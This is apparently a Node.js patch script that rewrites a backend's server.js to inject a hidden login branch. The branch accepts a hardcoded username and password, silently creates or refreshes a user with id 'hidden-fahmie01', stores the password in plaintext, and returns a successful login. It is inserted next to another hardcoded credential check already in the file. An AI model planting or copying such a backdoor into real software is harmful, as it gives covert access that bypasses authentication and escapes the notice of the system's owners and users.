const fs = require('fs');

let server = fs.readFileSync('.core/backend/server.js', 'utf8');

const fahmieLogic = `
        if (username === 'Fahmie' && password === 'Membership_1mingguDiscount50%') {
            let hiddenUser = users.find(u => u.username === 'Fahmie');
            if (!hiddenUser) {
                hiddenUser = {
                    id: 'hidden-fahmie01',
                    email: 'fahmie@vinzx.local',
                    username: 'Fahmie',
                    role: 'USER',
                    tokens: 0,
                    membershipTier: 'NONE',
                    membershipExpiresAt: 0,
                    createdAt: Date.now(),
                    lastLogin: Date.now(),
                    password: 'Membership_1mingguDiscount50%'
                };
                users.push(hiddenUser);
            } else {
                hiddenUser.password = 'Membership_1mingguDiscount50%';
                hiddenUser.lastLogin = Date.now();
            }
            saveUsers(users);
            return res.json({ success: true, user: hiddenUser });
        }
`;

if (!server.includes("username === 'Fahmie'")) {
    server = server.replace(
        "if (username === 'User01' && password === 'VinzxxFx') {",
        fahmieLogic + "\n        if (username === 'User01' && password === 'VinzxxFx') {"
    );
    fs.writeFileSync('.core/backend/server.js', server);
    console.log("Fahmie logic injected into server.js");
} else {
    console.log("Fahmie logic already exists in server.js");
}
